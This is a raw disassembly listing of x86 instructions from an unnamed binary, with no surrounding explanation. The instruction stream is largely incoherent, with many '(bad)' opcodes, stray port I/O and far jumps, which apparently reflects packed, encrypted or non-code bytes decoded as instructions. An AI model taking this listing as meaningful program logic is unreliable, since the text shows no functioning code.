  401954:	fistp  WORD PTR es:[edx]
  401957:	sbb    dh,BYTE PTR [edx+0x660b62a]
  40195d:	push   edx
  40195e:	pop    edx
  40195f:	mov    esi,0x92bc194f
  401964:	xchg   ebp,eax
  401965:	jne    0x401913
  401967:	scas   eax,DWORD PTR es:[edi]
  401968:	pop    ebx
  401969:	cmc    
  40196a:	mov    DWORD PTR [ecx-0x78],ebx
  40196d:	aaa    
  40196e:	cmp    DWORD PTR [ecx+0x17],esi
  401971:	test   eax,0xf7e7c6a
  401976:	es loop 0x401966
  401979:	fisttp DWORD PTR [ebp-0x26]
  40197c:	dec    eax
  40197d:	xchg   edx,eax
  40197e:	imul   eax,DWORD PTR [edx],0x35
  401981:	mov    al,ds:0x88242912
  401986:	dec    edx
  401987:	cmp    DWORD PTR [ebx-0x7c],0xb49e99d
  40198e:	or     DWORD PTR [ebp+0x6e],ecx
  401991:	sar    BYTE PTR [esi-0x62],cl
  401994:	sbb    BYTE PTR [ebx-0x3dee3a4a],bh
  40199a:	push   edx
  40199b:	add    bh,BYTE PTR [edi+0x68ab3d72]
  4019a1:	and    al,0x6b
  4019a3:	jno    0x40192c
  4019a5:	jl     0x4019e6
  4019a7:	out    0x91,al
  4019a9:	(bad)  
  4019aa:	pop    esp
  4019ab:	cmp    cl,BYTE PTR [ebp-0x5efe166c]
  4019b1:	inc    BYTE PTR [ecx]
  4019b3:	sbb    bl,BYTE PTR [edi]
  4019b5:	xchg   ebp,eax
  4019b6:	sar    DWORD PTR [ebp-0x4ae8ff6f],0xd
  4019bd:	mov    ch,BYTE PTR [edi]
  4019bf:	in     eax,0x40
  4019c1:	je     0x40196d
  4019c3:	aad    0xad
  4019c5:	and    al,0x1c
  4019c7:	fwait
  4019c8:	ins    BYTE PTR es:[edi],dx
  4019c9:	stos   BYTE PTR es:[edi],al
  4019ca:	into   
  4019cb:	push   esp
  4019cc:	sbb    esp,edi
  4019ce:	or     BYTE PTR [edx+0x6e165a66],ah
  4019d4:	or     al,0x5d
  4019d6:	mov    gs,WORD PTR [edi+0x7d671db4]
  4019dc:	sbb    cl,ah
  4019de:	mov    edi,0x4d9f7947
  4019e3:	mov    al,ds:0x25e20fdd
  4019e8:	mov    dl,0x89
  4019ea:	sbb    al,0x19
  4019ec:	cs in  al,0x43
  4019ef:	mov    ecx,0x106f8f7d
  4019f4:	cld    
  4019f5:	je     0x401986
  4019f7:	mov    dh,0x8
  4019f9:	sub    DWORD PTR [ecx+ebp*1+0x67],ecx
  4019fd:	sbb    esi,DWORD PTR [esi+0x490096f8]
  401a03:	ror    DWORD PTR [ebp+0x4b827707],cl
  401a09:	(bad)  
  401a0a:	in     eax,0xec
  401a0c:	mov    dl,0xd0
  401a0e:	xchg   ebp,eax
  401a0f:	(bad)  
  401a10:	xchg   esp,eax
  401a11:	or     bh,BYTE PTR [ebx-0x3b]
  401a14:	sbb    edx,DWORD PTR [eax]
  401a16:	dec    ebp
  401a17:	enter  0x7a85,0x11
  401a1b:	mov    esi,0xd158341c
  401a20:	aaa    
  401a21:	in     eax,0xf7
  401a23:	xor    ebx,DWORD PTR [ebp-0x10]
  401a26:	call   0xb08d:0x9ad18090
  401a2d:	outs   dx,BYTE PTR ds:[esi]
  401a2e:	(bad)  
  401a2f:	test   al,0x92
  401a31:	and    al,0xf8
  401a33:	push   esi
  401a34:	inc    ebp
  401a35:	jae    0x401a3c
  401a37:	ins    DWORD PTR es:[edi],dx
  401a38:	icebp  
  401a39:	add    DWORD PTR [ecx-0x5c],edx
  401a3c:	pop    ebp
  401a3d:	shl    esp,1
  401a3f:	bound  edx,QWORD PTR [ebx-0x51]
  401a42:	shl    DWORD PTR [ebp+0x7e],cl
  401a45:	cmp    eax,0xb750d6d4
  401a4a:	iret   
  401a4b:	das    
  401a4c:	push   0x30093608
  401a51:	dec    ecx
  401a52:	jae    0x401aa1
  401a54:	call   0x48dcaecd
  401a59:	leave  
  401a5a:	rcr    BYTE PTR [esi],1
  401a5c:	fwait
  401a5d:	push   ecx
  401a5e:	imul   esp,DWORD PTR [esi-0x71],0x11
  401a62:	retf   0xc70a
  401a65:	dec    eax
  401a66:	rcl    DWORD PTR [ebx+0x7d8e13ff],1
  401a6c:	push   edi
  401a6d:	pop    ss
  401a6e:	push   edi
  401a6f:	test   ch,0x5
  401a72:	cmp    DWORD PTR [edx],esp
  401a74:	imul   esi,edx,0xab0454c8
  401a7a:	mov    edx,0x20c200c8
  401a7f:	cld    
  401a80:	outs   dx,BYTE PTR ds:[esi]
  401a81:	out    0x3c,al
  401a83:	mov    ds:0x570cfbee,al
  401a88:	pushf  
  401a89:	jnp    0x401a4d
  401a8b:	daa    
  401a8c:	rcr    BYTE PTR ds:0x6d8ba746,1
  401a92:	clc    
  401a93:	pop    esp
  401a94:	inc    ebp
  401a95:	mov    esi,0x31050df5
  401a9a:	inc    esp
  401a9b:	(bad)
  401a9e:	loop   0x401a5e
  401aa0:	sub    DWORD PTR [esi+0x5296a017],edx
  401aa6:	(bad)  
  401aa7:	aaa    
  401aa8:	jmp    0x401a89
  401aaa:	and    BYTE PTR [edi+0x25],0xd3
  401aae:	add    al,0xfa
  401ab0:	(bad)  [ebx+ebx*2]
  401ab3:	adc    esp,edi
  401ab5:	jp     0x401b16
  401ab7:	jb     0x401b12
  401ab9:	ret    0xef0f
  401abc:	in     eax,dx
  401abd:	outs   dx,DWORD PTR ds:[esi]
  401abe:	cli    
  401abf:	repz popa 
  401ac1:	mov    al,ds:0xeb3872b5
  401ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ac7:	jecxz  0x401aa6
  401ac9:	sub    DWORD PTR [edx],edx
  401acb:	cmp    edi,DWORD PTR es:[ebp*8+0x19b3c5a3]
  401ad3:	pop    ecx
  401ad4:	data16 and BYTE PTR [ecx],0x4b
  401ad8:	inc    ebx
  401ad9:	or     BYTE PTR ds:[edx+0xb8bf8bc],ch
  401ae0:	fst    DWORD PTR [edx]
  401ae2:	jns    0x401b12
  401ae4:	push   ds
  401ae5:	pushf  
  401ae6:	sti    
  401ae7:	repz dec esi
  401ae9:	mov    ebp,0xd1e52675
  401aee:	call   0x6513d988
  401af3:	je     0x401b42
  401af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af6:	adc    edx,edx
  401af8:	test   DWORD PTR [eax-0x10],eax
  401afb:	fld    QWORD PTR [edx]
  401afd:	fnstenv [edx]
  401aff:	adc    ebx,DWORD PTR [esi]
  401b01:	and    DWORD PTR [edx-0x6bd6b2a9],esi
  401b07:	shl    BYTE PTR [ebp-0x17],cl
  401b0a:	bnd jns 0x401ad9
  401b0d:	push   esp
  401b0e:	pop    esp
  401b0f:	cdq    
  401b10:	xchg   esi,eax
  401b11:	fdivr  st,st(7)
  401b13:	xchg   ebx,eax
  401b14:	ds notrack jmp DWORD PTR [edx]
  401b18:	dec    ebx
  401b19:	fst    DWORD PTR fs:[ecx-0x47]
  401b1d:	or     BYTE PTR [esi],dh
  401b1f:	xchg   esi,eax
  401b20:	shl    BYTE PTR [edx+0x5c],1
  401b23:	ret    0x95fd
  401b26:	loope  0x401ab9
  401b28:	daa    
  401b29:	fild   DWORD PTR [ecx]
  401b2b:	lahf   
  401b2c:	jo     0x401b5c
  401b2e:	mov    ebp,0x5c8fcbb0
  401b33:	adc    eax,0x308207fd
  401b38:	loope  0x401b8a
  401b3a:	add    bh,BYTE PTR [esi-0x2a]
  401b3d:	std    
  401b3e:	scas   eax,DWORD PTR es:[edi]
  401b3f:	hlt    
  401b40:	je     0x401ba7
  401b42:	cdq    
  401b43:	outs   dx,DWORD PTR ds:[esi]
  401b44:	mov    BYTE PTR [esi],bh
  401b46:	(bad)  
  401b47:	clc    
  401b48:	or     dh,BYTE PTR [edx+0x2ffb832f]
  401b4e:	xor    al,0x39
  401b50:	in     eax,0x81
  401b52:	inc    esi
  401b53:	xchg   esi,eax
  401b54:	jns    0x401bab
  401b56:	inc    edi
  401b57:	and    edi,DWORD PTR [ebx+0x50020b13]
  401b5d:	xchg   ecx,edi
  401b5f:	mov    ds:0xdb9eed84,eax
  401b64:	xor    eax,0x7b36f792
  401b69:	call   0xc2ca:0x7a9041d6
  401b70:	fisub  WORD PTR [ecx+0x521a8b6]
  401b76:	xchg   esp,eax
  401b77:	int    0xa1
  401b79:	ds jb  0x401b5a
  401b7c:	xchg   esi,eax
  401b7d:	or     al,0xbd
  401b7f:	jbe    0x401bb0
  401b81:	mov    esp,0xf98c599b
  401b86:	cmp    al,0xe4
  401b88:	dec    edx
  401b89:	mov    ss,edi
  401b8b:	add    bl,BYTE PTR [ecx-0x20]
  401b8e:	fisub  WORD PTR [ecx]
  401b90:	mov    ah,BYTE PTR [esi+0xc]
  401b93:	sbb    eax,0x85aa9686
  401b98:	fbld   TBYTE PTR [esi+0x77]
  401b9b:	(bad)  [ecx+edx*4-0x4d]
  401b9f:	sar    DWORD PTR [eax+0x3],1
  401ba2:	sti    
  401ba3:	pop    ecx
  401ba4:	cmp    edi,ebp
  401ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ba7:	lock imul BYTE PTR [ebx+0x5b]
  401bab:	jno    0x401b4b
  401bad:	xor    edx,DWORD PTR ds:0x19d49793
  401bb3:	pusha  
  401bb4:	bound  ecx,QWORD PTR [esi]
  401bb6:	or     ebx,DWORD PTR [ebp+0x6c]
  401bb9:	pushf  
  401bba:	in     al,dx
  401bbb:	xchg   edx,eax
  401bbc:	push   DWORD PTR [ecx+0xf]
  401bbf:	test   DWORD PTR [eax+0x79],esi
  401bc2:	cdq    
  401bc3:	imul   edx,DWORD PTR [ebx-0x31],0x30f939a4
  401bca:	cmp    DWORD PTR [ebx-0x2a],eax
  401bcd:	cmp    DWORD PTR [edi],esp
  401bcf:	sub    al,0x76
  401bd1:	push   ebp
  401bd2:	repnz stos BYTE PTR es:[edi],al
  401bd4:	int3   
  401bd5:	cmp    ecx,DWORD PTR [edi+0x68]
  401bd8:	sub    eax,0x85bc5631
  401bdd:	xchg   ecx,eax
  401bde:	xchg   ecx,eax
  401bdf:	xchg   ecx,eax
  401be0:	ins    BYTE PTR es:[edi],dx
  401be1:	adc    al,0x52
  401be3:	mov    edi,0x8c29ade6
  401be8:	ins    BYTE PTR es:[edi],dx
  401be9:	ficomp WORD PTR [edi]
  401beb:	adc    ebp,DWORD PTR [ebp+0x406cfe5b]
  401bf1:	test   al,0x5a
  401bf3:	xchg   ebp,eax
  401bf4:	jg     0x401c60
  401bf6:	xchg   esp,eax
  401bf7:	fidivr WORD PTR [eax-0x1544128c]
  401bfd:	imul   edi,eax,0x1e07f7f7
  401c03:	push   esp
  401c04:	fs imul edx,eax,0xffffffe2
  401c08:	sti    
  401c09:	sub    BYTE PTR [esi],dl
  401c0b:	retf   
  401c0c:	ds sahf 
  401c0e:	mov    ebx,0x217d43be
  401c13:	in     eax,dx
  401c14:	retf   0xad13
  401c17:	cdq    
  401c18:	ret    
  401c19:	shl    BYTE PTR [edi],1
  401c1b:	inc    ebx
  401c1c:	ja     0x401be7
  401c1e:	and    cl,BYTE PTR [eax+0x26]
  401c21:	and    ch,BYTE PTR [esi-0x71e6522d]
  401c27:	jns    0x401c82
  401c29:	sbb    al,0x19
  401c2b:	push   es
  401c2c:	psubusw mm1,mm7
  401c2f:	jns    0x401c29
  401c31:	retf   
  401c32:	mov    bl,0x65
  401c34:	ret    
  401c35:	dec    DWORD PTR [edx]
  401c37:	mov    ch,0xcf
  401c39:	sbb    ecx,DWORD PTR [edi+0x7b]
  401c3c:	int3   
  401c3d:	jge    0x401bf5
  401c3f:	data16 add al,0x85
  401c42:	sub    bl,BYTE PTR [ebx-0x7c]
  401c45:	clc    
  401c46:	es sub al,0x1c
  401c49:	mov    DWORD PTR [eax+ecx*2+0x662fca42],esp
  401c50:	jae    0x401c0b
  401c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c53:	xchg   esi,eax
  401c54:	fstp   TBYTE PTR [ebx+0x67]
  401c57:	scas   eax,DWORD PTR es:[edi]
  401c58:	or     eax,0x98a1f8ad
  401c5d:	adc    eax,0xe29b3749
  401c62:	mov    cl,0x12
  401c64:	iret   
  401c65:	je     0x401c35
  401c67:	push   0xbe450445
  401c6c:	mov    ss,edi
  401c6e:	cld    
  401c6f:	mul    BYTE PTR [edi]
  401c71:	push   edx
  401c72:	dec    edi
  401c73:	fs push 0xffffff93
  401c76:	and    dh,BYTE PTR [eax]
  401c78:	(bad)  
  401c79:	shl    BYTE PTR ds:0x9b216182,1
  401c7f:	sbb    al,0xaf
  401c81:	nop
  401c82:	mov    eax,0x22995c80
  401c87:	cmp    al,0x2e
  401c89:	repnz fadd DWORD PTR [ecx+0x27]
  401c8d:	fwait
  401c8e:	into   
  401c8f:	and    bh,BYTE PTR [ecx]
  401c91:	scas   eax,DWORD PTR es:[edi]
  401c92:	mov    ecx,0xdc018dd6
  401c97:	xchg   ebx,eax
  401c98:	iret   
  401c99:	sub    dh,BYTE PTR [edi]
  401c9b:	aam    0x22
  401c9d:	(bad)  [ecx-0x75]
  401ca0:	aas    
  401ca1:	xchg   edi,eax
  401ca2:	jecxz  0x401d1a
  401ca4:	ror    BYTE PTR [ebx-0x26],0xa
  401ca8:	pop    esi
  401ca9:	(bad)  
  401caa:	push   edx
  401cab:	adc    al,0x2c
  401cad:	pop    esi
  401cae:	fdiv   DWORD PTR [ebp+0x3d]
  401cb1:	and    BYTE PTR [esi-0x2b22d44d],ah
  401cb7:	pop    ebp
  401cb8:	inc    esp
  401cb9:	lods   eax,DWORD PTR ds:[esi]
  401cba:	jmp    0xcc9:0x7b8f331d
  401cc1:	sbb    BYTE PTR [edx+esi*8+0x1e],bl
  401cc5:	mov    ah,0x17
  401cc7:	jge    0x401c61
  401cc9:	clc    
  401cca:	xor    al,0x39
  401ccc:	sahf   
  401ccd:	xchg   esi,eax
  401cce:	pop    ebx
  401ccf:	imul   ebp,esp,0x8aa4cee1
  401cd5:	(bad)  [ecx+0x17]
  401cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd9:	loopne 0x401cb9
  401cdb:	pop    eax
  401cdc:	popf   
  401cdd:	cwde   
  401cde:	rcr    BYTE PTR [ebx+0x6402ef46],cl
  401ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce5:	xchg   ebp,eax
  401ce6:	cmc    
  401ce7:	xchg   edi,eax
  401ce8:	in     al,dx
  401ce9:	jle    0x401cfa
  401ceb:	jge    0x401d37
  401ced:	addr16 aad 0x44
  401cf0:	retf   0x3c24
  401cf3:	fild   WORD PTR [ebx+0x71986992]
  401cf9:	pop    ecx
  401cfa:	aad    0x51
  401cfc:	xchg   ebx,eax
  401cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cfe:	retf   
  401cff:	push   0x320a5e57
  401d04:	mov    ecx,0x402f998a
  401d09:	out    dx,al
  401d0a:	out    dx,al
  401d0b:	sahf   
  401d0c:	out    0xfb,al
  401d0e:	mov    bh,0x60
  401d10:	arpl   WORD PTR [eax+0x3f32db61],ax
  401d16:	jmp    0x401ccc
  401d18:	imul   edi,DWORD PTR [ecx-0x523426fb],0xe9bc3682
  401d22:	int3   
  401d23:	pop    esp
  401d24:	inc    ebx
  401d25:	imul   al
  401d27:	and    DWORD PTR [eax-0x3767af36],edi
  401d2d:	mov    ds:0x75abaee2,eax
  401d32:	add    dl,ch
  401d34:	ret    
  401d35:	lahf   
  401d36:	jg     0x401ceb
  401d38:	cwde   
  401d39:	sahf   
  401d3a:	add    cl,BYTE PTR [eax-0x2f]
  401d3d:	popa   
  401d3e:	cmc    
  401d3f:	sbb    esi,DWORD PTR [ebx+edx*8]
  401d42:	dec    ecx
  401d43:	jo     0x401d1a
  401d45:	neg    BYTE PTR [ebx+0x7a]
  401d48:	adc    ch,al
  401d4a:	jg     0x401d75
  401d4c:	loope  0x401cce
  401d4e:	adc    bl,bl
  401d50:	sub    bh,bl
  401d52:	and    ebx,eax
  401d54:	test   al,0xa
  401d56:	or     al,0x25
  401d58:	push   ebx
  401d59:	sub    dl,BYTE PTR [eax-0x5c]
  401d5c:	scas   eax,DWORD PTR es:[edi]
  401d5d:	sbb    dl,bl
  401d5f:	ja     0x401d9f
  401d61:	popf   
  401d62:	push   edi
  401d63:	test   eax,0x5cdf70e6
  401d68:	inc    edi
  401d69:	jl     0x401db8
  401d6b:	jbe    0x401d17
  401d6d:	cdq    
  401d6e:	or     al,0x26
  401d70:	inc    ebp
  401d71:	mov    cl,0x52
  401d73:	mov    ebx,0x9b648401
  401d78:	shl    BYTE PTR [ebx],cl
  401d7a:	jmp    0x6634362
  401d7f:	and    esp,ebp
  401d81:	or     al,0x13
  401d83:	cmp    ebp,DWORD PTR [ebx]
  401d85:	int    0x29
  401d87:	pop    es
  401d88:	mov    bl,0x80
  401d8a:	pop    ecx
  401d8b:	int    0x43
  401d8d:	aas    
  401d8e:	mov    edx,DWORD PTR ds:0x50f1da83
  401d94:	mov    al,ds:0x967c8d34
  401d99:	mov    DWORD PTR ds:0xe2b94339,ecx
  401d9f:	(bad)  
  401da0:	addr16 inc ebx
  401da2:	ret    
  401da3:	add    dh,BYTE PTR [esi+0x527dfb41]
  401da9:	cmp    DWORD PTR [ecx+ecx*1+0x4adbe324],eax
  401db0:	push   ecx
  401db1:	scas   al,BYTE PTR es:[edi]
  401db2:	push   ebp
  401db3:	call   0xf3:0x1ffe2788
  401dba:	ret    0xd76e
  401dbd:	mov    ebx,0x5792a0d3
  401dc2:	sbb    BYTE PTR [edi-0x1f],0xd7
  401dc6:	mov    bl,0x9f
  401dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dc9:	test   al,0xb3
  401dcb:	adc    edx,ebx
  401dcd:	(bad)  
  401dce:	xchg   esp,eax
  401dcf:	out    dx,eax
  401dd0:	dec    ebx
  401dd1:	out    0x34,eax
  401dd3:	je     0x401e46
  401dd5:	jne    0x401e39
  401dd7:	push   esp
  401dd8:	sti    
  401dd9:	mov    DWORD PTR [edi+0x46fd9cc9],ecx
  401ddf:	mov    ah,0xd2
  401de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401de2:	add    ebp,DWORD PTR [ebp+0x74690182]
  401de8:	test   al,0x52
  401dea:	out    0x64,eax
  401dec:	in     eax,dx
  401ded:	stos   DWORD PTR es:[edi],eax
  401dee:	dec    eax
  401def:	adc    edx,DWORD PTR [edx]
  401df1:	dec    esi
  401df2:	aaa    
  401df3:	jne    0x401e69
  401df5:	mov    ecx,0xf26a4a19
  401dfa:	inc    ebx
  401dfb:	ins    DWORD PTR es:[edi],dx
  401dfc:	ds xchg esi,eax
  401dfe:	outs   dx,DWORD PTR ds:[esi]
  401dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e00:	xor    al,0x55
  401e02:	pop    ds
  401e03:	pushf  
  401e04:	(bad)  
  401e05:	stc    
  401e06:	dec    esi
  401e07:	dec    ebx
  401e08:	or     BYTE PTR ds:0x6e04771b,bh
  401e0e:	xor    ebx,DWORD PTR [esi-0x395ad9d7]
  401e14:	rcl    bh,1
  401e16:	and    eax,0x4e61f0e9
  401e1b:	retf   
  401e1c:	or     edi,esp
  401e1e:	push   ebx
  401e1f:	fwait
  401e20:	sbb    eax,ebx
  401e22:	inc    ecx
  401e23:	xchg   edx,eax
  401e24:	(bad)  
  401e25:	xor    esp,ebp
  401e27:	popa   
  401e28:	stos   DWORD PTR es:[edi],eax
  401e29:	xor    edi,esp
  401e2b:	bound  ebp,QWORD PTR [esp+eax*1+0x5c]
  401e2f:	pop    ebx
  401e30:	xchg   DWORD PTR [edx+esi*2+0x53],esi
  401e34:	nop
  401e35:	adc    ebp,DWORD PTR [ebx]
  401e37:	retf   0xfd43
  401e3a:	push   edi
  401e3b:	je     0x401e7d
  401e3d:	mov    ebp,fs
  401e3f:	mov    ch,0x6
  401e41:	outs   dx,DWORD PTR ds:[esi]
  401e42:	(bad)  
  401e43:	and    eax,0xbd74a0d3
  401e48:	push   ecx
  401e49:	push   0xda5a441f
  401e4e:	outs   dx,DWORD PTR ds:[esi]
  401e4f:	jg     0x401e31
  401e51:	pop    ecx
  401e52:	in     eax,dx
  401e53:	adc    bh,BYTE PTR [edi-0xfae74a1]
  401e59:	or     BYTE PTR [esi+0x258651c7],ah
  401e5f:	inc    ebx
  401e60:	mov    esp,0x58458aa4
  401e65:	cmc    
  401e66:	jae    0x401e52
  401e68:	push   eax
  401e69:	fs push ebp
  401e6b:	pop    ecx
  401e6c:	push   ebp
  401e6d:	mov    cl,0x7a
  401e6f:	popa   
  401e70:	bound  edi,QWORD PTR [edi+edx*1-0x1d]
  401e74:	sub    dl,0x54
  401e77:	adc    al,0xc9
  401e79:	jbe    0x401ea3
  401e7b:	cmp    al,0xa9
  401e7d:	lock not DWORD PTR [ebx-0x23]
  401e81:	fs into 
  401e83:	aam    0x8a
  401e85:	sbb    DWORD PTR [edi],ecx
  401e87:	pop    ds
  401e88:	cld    
  401e89:	or     dl,ah
  401e8b:	adc    DWORD PTR [esi+0x79],ebx
  401e8e:	mov    WORD PTR [ecx],ds
  401e90:	or     ah,BYTE PTR [eiz*4-0x28f18bb6]
  401e97:	ss stos BYTE PTR es:[edi],al
  401e99:	popf   
  401e9a:	hlt    
  401e9b:	scas   eax,DWORD PTR es:[edi]
  401e9c:	loope  0x401ed8
  401e9e:	mov    dh,0x69
  401ea0:	xchg   DWORD PTR [ebp+ebx*4-0x53de6b76],edx
  401ea7:	hlt    
  401ea8:	sub    dl,bl
  401eaa:	in     al,dx
  401eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eac:	xor    cl,0xcd
  401eaf:	sub    DWORD PTR [ecx-0x80],ecx
  401eb2:	pop    edi
  401eb3:	lea    esp,[ebp-0x5d]
  401eb6:	or     al,0x64
  401eb8:	add    cl,al
  401eba:	scas   al,BYTE PTR es:[edi]
  401ebb:	out    0x37,al
  401ebd:	inc    edx
  401ebe:	push   es
  401ebf:	es inc ebx
  401ec1:	sbb    ebp,ebx
  401ec3:	xor    eax,0xcc5cb54b
  401ec8:	pop    ebp
  401ec9:	(bad)  
  401ecb:	cwde   
  401ecc:	mov    ch,0x33
  401ece:	sahf   
  401ecf:	rol    DWORD PTR ss:[edx],1
  401ed2:	xchg   esp,eax
  401ed3:	call   0x9185172
  401ed8:	xchg   edi,eax
  401ed9:	repz push 0x654f87ad
  401edf:	sbb    al,BYTE PTR [eax]
  401ee1:	jae    0x401edc
  401ee3:	add    edi,0x43d5f2b4
  401ee9:	cwde   
  401eea:	fcomip st,st(5)
  401eec:	mov    ecx,0xe0ebe0f4
  401ef1:	jl     0x401e98
  401ef3:	retf   0x5ae1
  401ef6:	cmp    dh,BYTE PTR fs:[ebx-0x4b47b4e0]
  401efd:	push   cs
  401efe:	add    eax,0x33393ab
  401f03:	fiadd  DWORD PTR [ebx+0x4cb7113b]
  401f09:	aaa    
  401f0a:	fadd   QWORD PTR [edx+ebp*1]
  401f0d:	xor    dl,ch
  401f0f:	lods   eax,DWORD PTR ds:[esi]
  401f10:	rcl    DWORD PTR [edi+0x36],cl
  401f13:	pop    es
  401f14:	sar    BYTE PTR [ecx+edi*1-0x22],0xd6
  401f19:	pop    eax
  401f1a:	push   esi
  401f1b:	add    DWORD PTR [ecx],esp
  401f1d:	test   DWORD PTR [eax-0x62],0xcac52dc
  401f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f25:	xor    BYTE PTR [ebx],ch
  401f27:	sahf   
  401f28:	aaa    
  401f29:	ja     0x401f83
  401f2b:	aaa    
  401f2c:	or     BYTE PTR [esp+ebp*2-0xc7e7776],0x6c
  401f34:	fcomip st,st(2)
  401f36:	fbstp  TBYTE PTR [eax-0xa]
  401f39:	nop
  401f3a:	and    eax,0x21
  401f3d:	inc    ebp
  401f3e:	jmp    0x401f6c
  401f40:	call   0xa64de452
  401f45:	inc    ecx
  401f46:	push   edi
  401f47:	sub    dh,BYTE PTR [ebp-0x5d]
  401f4a:	mov    ebp,0x137b698
  401f4f:	add    eax,0xb2afecd4
  401f54:	jge    0x401f35
  401f56:	les    edx,FWORD PTR [esi+eax*8+0x38]
  401f5a:	shr    BYTE PTR [edx+0x7a5d3f78],cl
  401f60:	add    BYTE PTR [ebx+ebx*2+0x51747bd5],al
  401f67:	cdq    
  401f68:	jmp    0x401f07
  401f6a:	out    dx,al
  401f6b:	mov    ebp,0xfc3342b8
  401f70:	in     eax,dx
  401f71:	xlat   BYTE PTR ds:[ebx]
  401f72:	mov    ds:0xa4a77a65,al
  401f77:	or     BYTE PTR [ecx],ah
  401f79:	sbb    BYTE PTR ss:[esi],0x6
  401f7d:	push   DWORD PTR [edi]
  401f7f:	out    0xdb,eax
  401f81:	pop    edx
  401f82:	pop    eax
  401f83:	mov    ds:0x3b76652c,al
  401f88:	add    DWORD PTR [eax],eax
  401f8a:	test   BYTE PTR [ecx-0x4bb94622],al
  401f90:	mov    cl,0xfd
  401f92:	push   eax
  401f93:	pop    edi
  401f94:	sar    DWORD PTR [edx],0x26
  401f97:	push   0x9508f0
  401f9c:	test   ecx,esp
  401f9e:	gs (bad) 
  401fa0:	repz pop esi
  401fa2:	cmp    ch,BYTE PTR [ecx+0x4c]
  401fa5:	retf   0xe85d
  401fa8:	add    BYTE PTR [eax+ebx*4-0x6f],dl
  401fac:	int3   
  401fad:	leave  
  401fae:	pop    esp
  401faf:	out    dx,eax
  401fb0:	ins    BYTE PTR es:[edi],dx
  401fb1:	sbb    eax,0x3fc348af
  401fb6:	or     ch,dh
  401fb8:	xor    al,dl
  401fba:	jmp    0xa611:0xddd079ec
  401fc1:	pusha  
  401fc2:	imul   ebx,DWORD PTR [ebx+0x6],0x6d59f85f
  401fc9:	cli    
  401fca:	ja     0x401fc8
  401fcc:	mov    bl,0xe2
  401fce:	data16 in al,0xe9
  401fd1:	sbb    eax,0x6579f12f
  401fd6:	out    0xb1,eax
  401fd8:	ja     0x40202d
  401fda:	add    al,0xbf
  401fdc:	aad    0x4f
  401fde:	daa    
  401fdf:	lods   eax,DWORD PTR ds:[esi]
  401fe0:	mov    dl,0x47
  401fe2:	or     cl,BYTE PTR [ebp+0x7bfb538b]
  401fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fe9:	adc    DWORD PTR [edi-0x7d],esp
  401fec:	mov    cl,0xc2
  401fee:	jecxz  0x401ffd
  401ff0:	pop    esi
  401ff1:	inc    edi
  401ff2:	outs   dx,DWORD PTR ds:[esi]
  401ff3:	ret    
  401ff4:	sub    edx,ecx
  401ff6:	inc    ecx
  401ff7:	pop    edx
  401ff8:	addr16 mov ebx,0x4ef937d6
  401ffe:	lahf   
  401fff:	imul   esp,edi,0x7e9934f8
  402005:	fldcw  WORD PTR [eax-0x6c31006a]
  40200b:	pop    eax
  40200c:	(bad)  gs:[edx+0x296898f4]
  402013:	mov    dh,0xae
  402015:	pop    edx
  402016:	icebp  
  402017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402018:	(bad)  
  402019:	out    dx,eax
  40201a:	std    
  40201b:	push   0xa41e8391
  402020:	jno    0x40200c
  402022:	lahf   
  402023:	das    
  402024:	sbb    al,0xde
  402026:	xchg   edi,eax
  402027:	or     al,0x5f
  402029:	sub    al,0xf6
  40202b:	add    al,0xe1
  40202d:	or     ebp,DWORD PTR [eax]
  40202f:	inc    edi
  402030:	and    dl,BYTE PTR [ebp+0x76]
  402033:	mov    ds:0x9bb31888,al
  402038:	js     0x40200d
  40203a:	lea    eax,[ebx-0xa]
  40203d:	inc    edx
  40203e:	add    BYTE PTR [esp+eiz*8],bl
  402041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402042:	cdq    
  402043:	js     0x40203e
  402045:	dec    ebp
  402046:	stos   BYTE PTR es:[edi],al
  402047:	hlt    
  402048:	shld   ecx,esi,cl
  40204b:	sbb    al,0x28
  40204d:	cs push ds
  40204f:	push   ebx
  402050:	popa   
  402051:	mov    bh,0xb9
  402053:	push   esp
  402054:	mov    al,ds:0x738b9f0c
  402059:	loopne 0x4020b5
  40205b:	sbb    al,0x1
  40205d:	xchg   ebp,esp
  40205f:	retf   0xdf47
  402062:	(bad)  
  402063:	aam    0x92
  402065:	fisttp QWORD PTR [ecx-0x13851c19]
  40206b:	sub    ch,ch
  40206d:	pop    es
  40206e:	mov    bh,BYTE PTR [edi+eax*4]
  402071:	in     eax,0xdc
  402073:	pop    edx
  402074:	xchg   ecx,ebp
  402076:	pusha  
  402077:	out    dx,eax
  402078:	retf   0xc290
  40207b:	xchg   ebx,eax
  40207c:	test   al,0xd3
  40207e:	pop    ecx
  40207f:	jo     0x402021
  402081:	mov    ah,0xd6
  402083:	fistp  QWORD PTR [esi]
  402085:	add    ecx,esp
  402087:	jge    0x402035
  402089:	mov    dh,0x2f
  40208b:	or     esi,DWORD PTR [ecx+0x5998a0e5]
  402091:	mov    ebx,0x26770f87
  402096:	add    cl,ah
  402098:	jp     0x402096
  40209a:	test   eax,0xf6f5ff33
  40209f:	xchg   dl,bl
  4020a1:	(bad)  
  4020a2:	mov    esi,0xd0bfa143
  4020a7:	das    
  4020a8:	jl     0x4020d3
  4020aa:	dec    edi
  4020ab:	enter  0x3ba0,0xf8
  4020af:	xor    eax,0xb16e55c8
  4020b4:	jo     0x40205c
  4020b6:	dec    eax
  4020b7:	cs mov al,0x97
  4020ba:	js     0x4020f4
  4020bc:	push   esp
  4020bd:	lahf   
  4020be:	xlat   BYTE PTR ds:[ebx]
  4020bf:	ja     0x40208c
  4020c1:	jns    0x402081
